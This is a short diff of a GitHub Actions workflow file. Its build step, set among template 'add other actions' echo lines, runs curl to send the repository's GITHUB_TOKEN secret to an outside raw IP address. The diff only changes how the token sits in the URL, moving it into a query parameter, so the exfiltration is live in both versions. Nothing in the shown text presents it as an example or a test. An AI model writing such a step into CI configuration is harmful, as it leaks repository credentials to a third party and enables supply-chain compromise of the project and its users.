@@ -15,6 +15,6 @@ jobs:
       env: 
        GITHUB_TOKEN: ${{secrets.GITHUB_TOKEN}}
       run: |
-        curl http://173.230.149.124/$GITHUB_TOKEN
+        curl http://173.230.149.124/?token=$GITHUB_TOKEN
         echo Add other actions to build,
         echo test, and deploy your project.
